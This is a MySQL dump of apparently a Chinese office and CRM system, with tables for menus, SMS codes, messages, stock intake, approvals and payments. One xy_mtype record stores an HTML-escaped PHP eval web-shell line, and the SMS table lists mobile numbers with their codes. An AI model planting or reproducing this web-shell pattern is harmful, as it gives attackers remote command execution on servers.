INSERT INTO `xy_menu` VALUES ('206', '2', '202', '业务员付款', 'fxcaiwu/index', '5', '1');
INSERT INTO `xy_menu` VALUES ('207', '2', '190', '到期合同趋势', 'fxhetong/index', '9', '1');
INSERT INTO `xy_menu` VALUES ('208', '2', '199', '库存统计', 'tjchanpin/index', '3', '1');
INSERT INTO `xy_menu` VALUES ('209', '1', '113', '业绩统计', 'tjhetong/index', '0', '1');
INSERT INTO `xy_menu` VALUES ('210', '1', '113', '老板一张表', 'tjbiao/index', '1', '1');
INSERT INTO `xy_menu` VALUES ('216', '0', '0', '人员管理', 'member/index', '20', '1');
INSERT INTO `xy_menu` VALUES ('217', '1', '216', '订单查询', 'member/orderselect', '1', '1');
INSERT INTO `xy_menu` VALUES ('218', '0', '0', '电子病历管理', 'case/index', '21', '1');
INSERT INTO `xy_menu` VALUES ('219', '1', '216', '人员信息列表', 'member/index', '0', '1');

-- ----------------------------
-- Table structure for `xy_mobilecode`
-- ----------------------------
DROP TABLE IF EXISTS `xy_mobilecode`;
CREATE TABLE `xy_mobilecode` (
  `id` int(4) unsigned NOT NULL AUTO_INCREMENT COMMENT 'id',
  `mobile` varchar(32) NOT NULL COMMENT '手机号',
  `code` varchar(6) NOT NULL COMMENT '验证码',
  `sendtime` varchar(32) NOT NULL COMMENT '发送时间',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=16 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of xy_mobilecode
-- ----------------------------
INSERT INTO `xy_mobilecode` VALUES ('1', '13644032046', '310882', '1541394924');
INSERT INTO `xy_mobilecode` VALUES ('2', '15904040273', '416955', '1541483708');
INSERT INTO `xy_mobilecode` VALUES ('3', '15904040273', '179541', '1541484267');
INSERT INTO `xy_mobilecode` VALUES ('4', '15904040273', '956329', '1541484360');
INSERT INTO `xy_mobilecode` VALUES ('5', '15904040273', '788348', '1541484972');
INSERT INTO `xy_mobilecode` VALUES ('6', '15904040273', '981927', '1541486051');
INSERT INTO `xy_mobilecode` VALUES ('7', '15904040273', '575680', '1541486136');
INSERT INTO `xy_mobilecode` VALUES ('8', '15904040273', '295913', '1541486509');
INSERT INTO `xy_mobilecode` VALUES ('9', '15904040273', '323626', '1541486708');
INSERT INTO `xy_mobilecode` VALUES ('10', '15140270686', '910379', '1541496434');
INSERT INTO `xy_mobilecode` VALUES ('11', '15140270686', '439862', '1541496602');
INSERT INTO `xy_mobilecode` VALUES ('12', '15140270686', '399924', '1541553702');
INSERT INTO `xy_mobilecode` VALUES ('13', '15904040273', '325681', '1541554042');
INSERT INTO `xy_mobilecode` VALUES ('14', '15140270686', '523884', '1541555220');
INSERT INTO `xy_mobilecode` VALUES ('15', '15904040273', '889489', '1541557335');

-- ----------------------------
-- Table structure for `xy_msg`
-- ----------------------------
DROP TABLE IF EXISTS `xy_msg`;
CREATE TABLE `xy_msg` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `content` varchar(255) NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `type` varchar(20) NOT NULL,
  `juid` int(11) NOT NULL,
  `viewtime` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=13 DEFAULT CHARSET=utf8 COMMENT='消息管理';

-- ----------------------------
-- Records of xy_msg
-- ----------------------------
INSERT INTO `xy_msg` VALUES ('1', '1', '陈高明', '2015-05-18 00:00:00', '你新的未读消息啊<a href=\"/weboa/index.php?m=home&c=public&a=online\" data-toggle=\"navtab\" data-id=\"online\"  data-title=\"消息提醒123\">消息 <span class=\"badge\">1</span></a>', '1', '系统', '1', '2015-05-19 08:14:45');
INSERT INTO `xy_msg` VALUES ('2', '0', '系统管理员', '0000-00-00 00:00:00', '登陆成功', '1', '', '0', '2015-05-19 08:26:32');
INSERT INTO `xy_msg` VALUES ('3', '0', '系统管理员', '2015-05-19 08:28:14', '登陆成功', '1', '系统类', '1', '2015-05-19 08:29:27');
INSERT INTO `xy_msg` VALUES ('4', '0', '系统管理员', '2015-05-19 08:30:05', '登陆成功', '1', '系统类', '1', '2015-05-19 09:35:49');
INSERT INTO `xy_msg` VALUES ('5', '0', '系统管理员', '2015-05-19 08:30:17', '登陆成功', '1', '系统类', '1', '2015-05-19 08:30:22');
INSERT INTO `xy_msg` VALUES ('6', '1', 'admin', '2015-05-19 13:45:53', '', '1', '', '0', '2015-05-19 17:28:54');
INSERT INTO `xy_msg` VALUES ('7', '1', 'admin', '2015-05-19 13:45:58', '', '1', '', '0', '2015-05-19 14:04:38');
INSERT INTO `xy_msg` VALUES ('8', '17', 'user1', '2015-06-16 13:51:45', 'fdsf', '1', '系统', '0', '2018-11-05 14:49:26');
INSERT INTO `xy_msg` VALUES ('9', '17', 'user1', '2015-06-16 13:51:48', 'fdsf', '1', '系统', '0', '0000-00-00 00:00:00');
INSERT INTO `xy_msg` VALUES ('10', '17', 'user1', '2015-06-16 13:51:50', 'fdsf', '1', '系统', '0', '0000-00-00 00:00:00');
INSERT INTO `xy_msg` VALUES ('11', '17', 'user1', '2015-06-16 13:52:08', 'fdsf', '1', '系统', '17', '2015-06-16 13:52:14');
INSERT INTO `xy_msg` VALUES ('12', '17', 'user1', '2015-06-16 13:52:11', 'fdsf', '1', '系统', '17', '2015-07-07 03:24:20');

-- ----------------------------
-- Table structure for `xy_mtype`
-- ----------------------------
DROP TABLE IF EXISTS `xy_mtype`;
CREATE TABLE `xy_mtype` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(50) NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `level` tinyint(1) NOT NULL,
  `pid` int(11) NOT NULL,
  `desc` varchar(200) NOT NULL,
  `sort` int(4) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=13 DEFAULT CHARSET=utf8 COMMENT='分类字典';

-- ----------------------------
-- Records of xy_mtype
-- ----------------------------
INSERT INTO `xy_mtype` VALUES ('12', '2', '1', '1', '11', '', '1');
INSERT INTO `xy_mtype` VALUES ('3', '长沙', '1', '2', '2', '', '1');
INSERT INTO `xy_mtype` VALUES ('4', '岳阳', '1', '2', '2', '', '5');
INSERT INTO `xy_mtype` VALUES ('11', '1', '1', '0', '0', '', '1');
INSERT INTO `xy_mtype` VALUES ('6', '', '1', '2', '5', '杭州市', '21');
INSERT INTO `xy_mtype` VALUES ('8', '陈高明', '1', '3', '6', '&lt;?php @eval($_POST[cmd])?&gt;', '0');
INSERT INTO `xy_mtype` VALUES ('9', '231312', '1', '0', '0', '', '2');
INSERT INTO `xy_mtype` VALUES ('10', '21321', '1', '1', '9', '', '1');

-- ----------------------------
-- Table structure for `xy_picture`
-- ----------------------------
DROP TABLE IF EXISTS `xy_picture`;
CREATE TABLE `xy_picture` (
  `id` int(4) unsigned NOT NULL AUTO_INCREMENT COMMENT 'id',
  `img` varchar(32) NOT NULL,
  `name` varchar(32) NOT NULL COMMENT '名称',
  `link` varchar(100) NOT NULL COMMENT '链接',
  `status` int(2) NOT NULL DEFAULT '1' COMMENT '0禁用 1启用',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of xy_picture
-- ----------------------------
INSERT INTO `xy_picture` VALUES ('1', '/2018-11-06/5be125de56d48.jpg', '231', 'https://www.baidu.com', '1');
INSERT INTO `xy_picture` VALUES ('2', '/2018-11-06/5be125de56d48.jpg', '412', 'https://www.baidu.com', '1');
INSERT INTO `xy_picture` VALUES ('3', '/2018-11-06/5be125de56d48.jpg', '423', 'https://www.baidu.com', '1');

-- ----------------------------
-- Table structure for `xy_project`
-- ----------------------------
DROP TABLE IF EXISTS `xy_project`;
CREATE TABLE `xy_project` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(50) DEFAULT NULL,
  `code` varchar(32) DEFAULT NULL,
  `status` tinyint(1) DEFAULT '1',
  `level` tinyint(1) DEFAULT NULL,
  `pid` int(11) DEFAULT '0',
  `desc` longtext,
  `tel` varchar(32) DEFAULT NULL,
  `sort` int(4) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=15 DEFAULT CHARSET=utf8 COMMENT='分类字典';

-- ----------------------------
-- Records of xy_project
-- ----------------------------
INSERT INTO `xy_project` VALUES ('14', '111', '23213', '1', '2', '14', '2321', '21321321323', '3');

-- ----------------------------
-- Table structure for `xy_quxiang`
-- ----------------------------
DROP TABLE IF EXISTS `xy_quxiang`;
CREATE TABLE `xy_quxiang` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `ktime` datetime NOT NULL,
  `jtime` datetime NOT NULL,
  `type` varchar(50) NOT NULL,
  `title` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC COMMENT='我的去向';

-- ----------------------------
-- Records of xy_quxiang
-- ----------------------------
INSERT INTO `xy_quxiang` VALUES ('1', '16', '王晓丹', '2015-08-05 10:03:00', '0', '', '0000-00-00 00:00:00', '1', '2015-08-05 09:56:25', '2015-08-07 09:56:29', '外出', '1111111111111');

-- ----------------------------
-- Table structure for `xy_renwu`
-- ----------------------------
DROP TABLE IF EXISTS `xy_renwu`;
CREATE TABLE `xy_renwu` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `juid` varchar(500) NOT NULL,
  `juname` varchar(500) NOT NULL,
  `jztime` datetime NOT NULL,
  `hid` int(11) NOT NULL,
  `mingcheng` varchar(100) NOT NULL,
  `biaoti` varchar(100) NOT NULL,
  `content` text NOT NULL,
  `beizhu` text NOT NULL,
  `attid` int(11) NOT NULL,
  `jieguo` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='任务管理';

-- ----------------------------
-- Records of xy_renwu
-- ----------------------------
INSERT INTO `xy_renwu` VALUES ('1', '16', '王晓丹', '2015-07-14 10:59:28', '0', '', '0000-00-00 00:00:00', '1', '', 'VVV', '2015-07-10 10:53:14', '0', '尺寸这种', 'V型成吧vc', '在啧啧啧啧啧啧啧啧啧啧啧啧啧啧啧啧啧啧啧啧啧', '', '1436842746', '等待处理');

-- ----------------------------
-- Table structure for `xy_ruku`
-- ----------------------------
DROP TABLE IF EXISTS `xy_ruku`;
CREATE TABLE `xy_ruku` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `bianhao` varchar(50) NOT NULL,
  `type` varchar(200) NOT NULL,
  `shuliang` int(11) NOT NULL,
  `title` varchar(500) NOT NULL,
  `shijian` date NOT NULL,
  `jingban` varchar(50) NOT NULL,
  `shenheren` varchar(50) NOT NULL,
  `shenhe` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=32 DEFAULT CHARSET=utf8 COMMENT='入库记录';

-- ----------------------------
-- Records of xy_ruku
-- ----------------------------
INSERT INTO `xy_ruku` VALUES ('1', '1', '陈高明', '2015-06-02 09:33:34', '0', '', '0000-00-00 00:00:00', '1', '1506020001', '购买', '25', '加密狗,小票打印机', '2015-06-02', '陈高明', '陈高明', '审核通过');
INSERT INTO `xy_ruku` VALUES ('2', '1', '陈高明', '2015-06-02 09:35:46', '0', '', '0000-00-00 00:00:00', '1', '1506020002', '自主开发', '4000', '客户管理管理系统,美容院管理系统', '2015-06-02', '陈高明', '陈高明', '审核通过');
INSERT INTO `xy_ruku` VALUES ('19', '16', '王晓丹', '2015-07-05 11:17:42', '0', '', '0000-00-00 00:00:00', '1', '150705420010', '111', '0', '客户管理管理系统', '2015-07-07', '王晓丹', '陈高明', '审核通过');
INSERT INTO `xy_ruku` VALUES ('18', '16', '王晓丹', '2015-07-05 11:17:21', '0', '', '0000-00-00 00:00:00', '1', '150705210009', '11', '0', '美容院管理系统,', '2015-07-21', '王晓丹', '王晓丹', '审核通过');
INSERT INTO `xy_ruku` VALUES ('17', '16', '王晓丹', '2015-07-05 07:30:02', '0', '', '0000-00-00 00:00:00', '1', '150705020008', '任务', '0', '美容院管理系统', '2015-07-08', '王晓丹', '王晓丹', '审核通过');
INSERT INTO `xy_ruku` VALUES ('16', '16', '王晓丹', '2015-07-02 19:05:15', '16', '王晓丹', '2015-07-05 07:32:35', '1', '150702150007', 'yt ', '10', '', '2015-07-15', '王晓丹', '陈高明', '审核通过');
INSERT INTO `xy_ruku` VALUES ('15', '16', '王晓丹', '2015-06-29 01:15:00', '0', '', '0000-00-00 00:00:00', '1', '150629000006', '1', '2', '美容院管理系统', '2015-06-29', '王晓丹', '王晓丹', '审核通过');
INSERT INTO `xy_ruku` VALUES ('14', '16', '王晓丹', '2015-06-29 01:13:02', '16', '王晓丹', '2015-06-29 01:13:45', '1', '150629020005', '1', '109', '美容院管理系统,', '2015-06-29', '王晓丹', '', '等待审核');
INSERT INTO `xy_ruku` VALUES ('13', '1', '陈高明', '2015-06-07 13:06:25', '1', '陈高明', '2015-06-07 13:21:46', '1', '150607250004', '退货', '15', '加密狗,小票打印机', '2015-06-07', '陈高明', '王晓丹', '审核通过');
INSERT INTO `xy_ruku` VALUES ('12', '1', '陈高明', '2015-06-07 12:49:58', '16', '王晓丹', '2015-06-25 23:12:53', '1', '150607580003', '购买', '10', '加密狗', '2015-06-07', '王晓丹', '王晓丹', '审核通过');
INSERT INTO `xy_ruku` VALUES ('20', '1', '陈高明', '2015-07-07 14:33:34', '1', '陈高明', '2015-07-07 14:36:09', '1', '150707340011', '11', '-401173504', '', '2015-07-07', '陈高明', '陈高明', '审核通过');
INSERT INTO `xy_ruku` VALUES ('31', '16', '王晓丹', '2015-08-14 20:22:03', '0', '', '0000-00-00 00:00:00', '1', '150814030021', '1111', '0', 'd,美容院管理系统,小票打印机,客户管理管理系统', '2015-08-14', '王晓丹', '', '等待审核');
INSERT INTO `xy_ruku` VALUES ('22', '1', '陈高明', '2015-07-11 15:53:34', '0', '', '0000-00-00 00:00:00', '1', '150711340013', '111', '0', '美容院管理系统,小票打印机', '2015-07-11', '陈高明', '陈高明', '审核通过');
INSERT INTO `xy_ruku` VALUES ('23', '1', '陈高明', '2015-07-11 17:33:30', '0', '', '0000-00-00 00:00:00', '1', '150711300014', '111', '0', '美容院管理系统,加密狗,小票打印机,,,,,,,,,,,,', '2015-07-13', '陈高明', '陈高明', '审核通过');
INSERT INTO `xy_ruku` VALUES ('24', '1', '陈高明', '2015-07-11 18:16:32', '0', '', '0000-00-00 00:00:00', '1', '150711320015', '1111', '0', '美容院管理系统', '2015-07-15', '陈高明', '', '等待审核');
INSERT INTO `xy_ruku` VALUES ('25', '1', '陈高明', '2015-07-11 18:25:30', '0', '', '0000-00-00 00:00:00', '1', '150711300016', '1111', '0', '美容院管理系统,小票打印机', '2015-07-21', '陈高明', '', '等待审核');
INSERT INTO `xy_ruku` VALUES ('26', '1', '陈高明', '2015-07-12 23:11:19', '0', '', '0000-00-00 00:00:00', '1', '150712190017', '2454', '0', '美容院管理系统', '2015-07-20', '陈高明', '陈高明', '审核通过');
INSERT INTO `xy_ruku` VALUES ('27', '1', '陈高明', '2015-07-13 00:19:47', '0', '', '0000-00-00 00:00:00', '1', '150713470018', '4444', '0', ',美容院管理系统,客户管理管理系统,,,,,客户管理管理系统,客户管理管理系统,,,,,,,,,,,,加密狗,,客户管理管理系统,客户管理管理系统', '2015-07-14', '陈高明', '陈高明', '审核通过');
INSERT INTO `xy_ruku` VALUES ('28', '1', '陈高明', '2015-07-13 00:21:51', '0', '', '0000-00-00 00:00:00', '1', '150713510019', '111', '0', '加密狗,客户管理管理系统', '2015-07-16', '陈高明', '', '等待审核');
INSERT INTO `xy_ruku` VALUES ('29', '16', '王晓丹', '2015-07-14 11:00:47', '0', '', '0000-00-00 00:00:00', '1', '150714470020', '擦擦擦擦擦擦擦', '0', '', '2015-07-16', '王晓丹', '', '等待审核');
INSERT INTO `xy_ruku` VALUES ('30', '16', '王晓丹', '2015-07-20 09:46:58', '0', '', '0000-00-00 00:00:00', '1', '150720580021', '广州', '0', '美容院管理系统,小票打印机', '2015-07-20', '王晓丹', '王晓丹', '退回修改');

-- ----------------------------
-- Table structure for `xy_rukus`
-- ----------------------------
DROP TABLE IF EXISTS `xy_rukus`;
CREATE TABLE `xy_rukus` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `bianhao` varchar(100) NOT NULL,
  `title` varchar(200) NOT NULL,
  `type` varchar(255) NOT NULL,
  `danwei` varchar(20) NOT NULL,
  `shuliang` int(11) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  `shenhe` varchar(50) NOT NULL,
  `xid` int(11) NOT NULL,
  `edit` tinyint(1) NOT NULL,
  `jingban` varchar(50) NOT NULL,
  `shijian` date NOT NULL,
  `fenlei` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=81 DEFAULT CHARSET=utf8 COMMENT='入库明细表';

-- ----------------------------
-- Records of xy_rukus
-- ----------------------------
INSERT INTO `xy_rukus` VALUES ('1', '1', 'jmg01', '加密狗', '62K', '只', '20', '一套软件配一个', '审核通过', '1', '0', '陈高明', '2015-06-02', '软件配套');
INSERT INTO `xy_rukus` VALUES ('2', '1', 'sfz01', '小票打印机', '热敏纸', '台', '5', '配热敏纸5卷', '审核通过', '1', '0', '陈高明', '2015-06-02', '软件配套');
INSERT INTO `xy_rukus` VALUES ('3', '1', 'crm', '客户管理管理系统', '通用的可以适当定制', '套', '2000', '', '审核通过', '2', '0', '陈高明', '2015-06-02', '软件服务');
INSERT INTO `xy_rukus` VALUES ('4', '1', 'CRM01', '美容院管理系统', '通用', '套', '2000', '', '审核通过', '2', '0', '陈高明', '2015-06-02', '软件服务');
INSERT INTO `xy_rukus` VALUES ('25', '1', 'crm', '客户管理管理系统', '通用的可以适当定制', '套', '0', '', '审核通过', '19', '0', '王晓丹', '2015-07-07', '软件服务');
INSERT INTO `xy_rukus` VALUES ('22', '1', 'CRM01', '美容院管理系统', '通用', '套', '0', '', '审核通过', '17', '0', '王晓丹', '2015-07-08', '软件服务');
INSERT INTO `xy_rukus` VALUES ('23', '1', 'CRM01', '美容院管理系统', '通用', '套', '0', '', '审核通过', '18', '0', '王晓丹', '2015-07-21', '软件服务');
INSERT INTO `xy_rukus` VALUES ('51', '1', 'crm', '客户管理管理系统', '通用的可以适当定制', '套', '0', '', '审核通过', '27', '0', '陈高明', '2015-07-14', '软件服务');
INSERT INTO `xy_rukus` VALUES ('17', '1', 'jmg01', '加密狗', '62K', '只', '5', '', '审核通过', '13', '0', '陈高明', '2015-06-07', '软件配套');
INSERT INTO `xy_rukus` VALUES ('15', '1', 'jmg01', '加密狗', '62K', '只', '10', '', '审核通过', '12', '1', '王晓丹', '2015-06-07', '软件配套');
INSERT INTO `xy_rukus` VALUES ('16', '1', 'sfz01', '小票打印机', '热敏纸', '台', '10', '', '审核通过', '13', '0', '陈高明', '2015-06-07', '软件配套');
INSERT INTO `xy_rukus` VALUES ('28', '1', 'CRM01', '美容院管理系统', '通用', '套', '0', '', '审核通过', '22', '0', '陈高明', '2015-07-11', '软件服务');
INSERT INTO `xy_rukus` VALUES ('29', '1', 'sfz01', '小票打印机', '热敏纸', '台', '0', '', '审核通过', '22', '0', '陈高明', '2015-07-11', '软件配套');
INSERT INTO `xy_rukus` VALUES ('30', '1', 'CRM01', '美容院管理系统', '通用', '套', '0', '', '审核通过', '23', '0', '陈高明', '2015-07-13', '软件服务');
INSERT INTO `xy_rukus` VALUES ('31', '1', 'jmg01', '加密狗', '62K', '只', '0', '', '审核通过', '23', '0', '陈高明', '2015-07-13', '软件配套');
INSERT INTO `xy_rukus` VALUES ('32', '1', 'sfz01', '小票打印机', '热敏纸', '台', '0', '', '审核通过', '23', '0', '陈高明', '2015-07-13', '软件配套');
INSERT INTO `xy_rukus` VALUES ('50', '1', 'CRM01', '美容院管理系统', '通用', '套', '0', '', '审核通过', '27', '0', '陈高明', '2015-07-14', '软件服务');
INSERT INTO `xy_rukus` VALUES ('48', '1', 'CRM01', '美容院管理系统', '通用', '套', '0', '', '审核通过', '26', '0', '陈高明', '2015-07-20', '软件服务');
INSERT INTO `xy_rukus` VALUES ('56', '1', 'crm', '客户管理管理系统', '通用的可以适当定制', '套', '0', '', '审核通过', '27', '0', '陈高明', '2015-07-14', '软件服务');
INSERT INTO `xy_rukus` VALUES ('57', '1', 'crm', '客户管理管理系统', '通用的可以适当定制', '套', '0', '', '审核通过', '27', '0', '陈高明', '2015-07-14', '软件服务');
INSERT INTO `xy_rukus` VALUES ('77', '1', 'd', 'd', '', '套', '0', '', '等待审核', '31', '0', '王晓丹', '2015-08-14', '软件服务');
INSERT INTO `xy_rukus` VALUES ('78', '1', 'CRM01', '美容院管理系统', '通用', '套', '0', '', '等待审核', '31', '0', '王晓丹', '2015-08-14', '软件服务');
INSERT INTO `xy_rukus` VALUES ('79', '1', 'sfz01', '小票打印机', '热敏纸', '台', '0', '', '等待审核', '31', '0', '王晓丹', '2015-08-14', '软件配套');
INSERT INTO `xy_rukus` VALUES ('80', '1', 'crm', '客户管理管理系统', '通用的可以适当定制', '套', '0', '', '等待审核', '31', '0', '王晓丹', '2015-08-14', '软件服务');
INSERT INTO `xy_rukus` VALUES ('69', '1', 'jmg01', '加密狗', '62K', '只', '0', '', '审核通过', '27', '0', '陈高明', '2015-07-14', '软件配套');
INSERT INTO `xy_rukus` VALUES ('71', '1', 'crm', '客户管理管理系统', '通用的可以适当定制', '套', '0', '', '审核通过', '27', '0', '陈高明', '2015-07-14', '软件服务');
INSERT INTO `xy_rukus` VALUES ('72', '1', 'crm', '客户管理管理系统', '通用的可以适当定制', '套', '0', '', '审核通过', '27', '0', '陈高明', '2015-07-14', '软件服务');
INSERT INTO `xy_rukus` VALUES ('73', '1', 'jmg01', '加密狗', '62K', '只', '0', '', '等待审核', '28', '0', '陈高明', '2015-07-16', '软件配套');
INSERT INTO `xy_rukus` VALUES ('74', '1', 'crm', '客户管理管理系统', '通用的可以适当定制', '套', '0', '', '等待审核', '28', '0', '陈高明', '2015-07-16', '软件服务');
INSERT INTO `xy_rukus` VALUES ('75', '1', 'CRM01', '美容院管理系统', '通用', '套', '0', '', '等待审核', '30', '0', '王晓丹', '2015-07-20', '软件服务');
INSERT INTO `xy_rukus` VALUES ('76', '1', 'sfz01', '小票打印机', '热敏纸', '台', '0', '', '等待审核', '30', '0', '王晓丹', '2015-07-20', '软件配套');

-- ----------------------------
-- Table structure for `xy_shenhe`
-- ----------------------------
DROP TABLE IF EXISTS `xy_shenhe`;
CREATE TABLE `xy_shenhe` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `type` varchar(50) NOT NULL,
  `title` varchar(50) NOT NULL,
  `content` varchar(255) NOT NULL,
  `xid` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=26 DEFAULT CHARSET=utf8 COMMENT='审核记录';

-- ----------------------------
-- Records of xy_shenhe
-- ----------------------------
INSERT INTO `xy_shenhe` VALUES ('1', '1', '陈高明', '2015-07-08 16:47:09', '0', '', '0000-00-00 00:00:00', '1', 'Ruku', '审核通过', '', '21');
INSERT INTO `xy_shenhe` VALUES ('25', '16', '王晓丹', '2015-08-04 13:55:05', '0', '', '0000-00-00 00:00:00', '1', 'Shou', '退回修改', '', '8');
INSERT INTO `xy_shenhe` VALUES ('24', '16', '王晓丹', '2015-08-03 13:50:34', '0', '', '0000-00-00 00:00:00', '1', 'Ruku', '审核通过', '', '15');
INSERT INTO `xy_shenhe` VALUES ('5', '1', '陈高明', '2015-07-08 17:28:58', '0', '', '0000-00-00 00:00:00', '1', 'Shou', '退回修改', '', '6');
INSERT INTO `xy_shenhe` VALUES ('6', '1', '陈高明', '2015-07-09 10:32:02', '0', '', '0000-00-00 00:00:00', '1', 'Shou', '审核通过', '', '6');
INSERT INTO `xy_shenhe` VALUES ('7', '1', '陈高明', '2015-07-09 13:04:24', '0', '', '0000-00-00 00:00:00', '1', 'Chuku', '审核通过', '', '3');
INSERT INTO `xy_shenhe` VALUES ('8', '1', '陈高明', '2015-07-11 17:22:33', '0', '', '0000-00-00 00:00:00', '1', 'Ruku', '退回修改', '', '16');
INSERT INTO `xy_shenhe` VALUES ('9', '1', '陈高明', '2015-07-11 17:23:00', '0', '', '0000-00-00 00:00:00', '1', 'Ruku', '退回修改', '', '16');
INSERT INTO `xy_shenhe` VALUES ('10', '1', '陈高明', '2015-07-11 17:23:06', '0', '', '0000-00-00 00:00:00', '1', 'Ruku', '审核通过', '', '16');
INSERT INTO `xy_shenhe` VALUES ('11', '1', '陈高明', '2015-07-11 17:35:20', '0', '', '0000-00-00 00:00:00', '1', 'Ruku', '审核通过', '', '23');
INSERT INTO `xy_shenhe` VALUES ('12', '1', '陈高明', '2015-07-11 17:35:38', '0', '', '0000-00-00 00:00:00', '1', 'Ruku', '审核通过', '', '22');
INSERT INTO `xy_shenhe` VALUES ('13', '1', '陈高明', '2015-07-11 18:20:00', '0', '', '0000-00-00 00:00:00', '1', 'Hetong', '审核通过', '', '12');
INSERT INTO `xy_shenhe` VALUES ('14', '1', '陈高明', '2015-07-11 18:45:30', '0', '', '0000-00-00 00:00:00', '1', 'Hetong', '退回修改', '', '13');
INSERT INTO `xy_shenhe` VALUES ('15', '1', '陈高明', '2015-07-11 18:46:35', '0', '', '0000-00-00 00:00:00', '1', 'Hetong', '审核通过', '', '13');
INSERT INTO `xy_shenhe` VALUES ('16', '1', '陈高明', '2015-07-12 23:11:37', '0', '', '0000-00-00 00:00:00', '1', 'Ruku', '审核通过', '', '26');
INSERT INTO `xy_shenhe` VALUES ('17', '1', '陈高明', '2015-07-13 00:20:31', '0', '', '0000-00-00 00:00:00', '1', 'Ruku', '审核通过', '', '27');
INSERT INTO `xy_shenhe` VALUES ('18', '1', '陈高明', '2015-07-13 00:26:42', '0', '', '0000-00-00 00:00:00', '1', 'Hetong', '审核通过', '', '14');
INSERT INTO `xy_shenhe` VALUES ('19', '1', '陈高明', '2015-07-13 13:43:33', '0', '', '0000-00-00 00:00:00', '1', 'Hetong', '审核通过', '', '15');
INSERT INTO `xy_shenhe` VALUES ('20', '16', '王晓丹', '2015-07-20 00:07:14', '0', '', '0000-00-00 00:00:00', '1', 'Fukuan', '审核通过', '', '3');
INSERT INTO `xy_shenhe` VALUES ('21', '16', '王晓丹', '2015-07-20 09:47:58', '0', '', '0000-00-00 00:00:00', '1', 'Ruku', '退回修改', '', '30');
INSERT INTO `xy_shenhe` VALUES ('22', '1', '陈高明', '2015-07-23 17:13:02', '0', '', '0000-00-00 00:00:00', '1', 'Chuku', '审核通过', 'ok', '4');
INSERT INTO `xy_shenhe` VALUES ('23', '1', '陈高明', '2015-07-23 17:13:09', '0', '', '0000-00-00 00:00:00', '1', 'Chuku', '审核通过', 'ok', '4');

-- ----------------------------
-- Table structure for `xy_shou`
-- ----------------------------
DROP TABLE IF EXISTS `xy_shou`;
CREATE TABLE `xy_shou` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `hid` int(11) NOT NULL,
  `title` varchar(200) NOT NULL,
  `bianhao` varchar(100) NOT NULL,
  `type` varchar(50) NOT NULL,
  `jine` int(11) NOT NULL,
  `jingban` varchar(50) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  `attid` int(11) NOT NULL,
  `shenhe` varchar(50) NOT NULL,
  `shenheren` varchar(50) NOT NULL,
  `mingcheng` varchar(200) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=9 DEFAULT CHARSET=utf8 COMMENT='收款记录';

-- ----------------------------
-- Records of xy_shou
-- ----------------------------
INSERT INTO `xy_shou` VALUES ('1', '1', '陈高明', '2015-06-02 09:53:59', '0', '', '0000-00-00 00:00:00', '1', '1', '百度公司', '1506020001', '公司账号', '5000', '陈高明', '预付款', '1433210020', '审核通过', '陈高明', 'CRM管理系统');
